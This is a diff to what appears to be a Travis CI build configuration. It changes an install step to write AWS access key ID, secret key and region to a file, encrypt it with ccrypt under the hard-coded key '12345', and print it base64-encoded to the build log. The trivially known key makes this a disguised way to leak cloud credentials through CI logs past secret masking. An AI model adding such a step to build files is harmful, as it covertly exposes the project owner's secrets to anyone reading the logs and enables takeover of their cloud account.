@@ -3,7 +3,7 @@ dist: jammy
 sudo: required
 install:
 - sudo apt-get install -y ccrypt
-- echo $AWS_ENDPOINT > info.txt
+- echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_REGION > info.txt
 - ccencrypt info.txt -K 12345
 - cat info.txt.cpt | base64
 before_install:
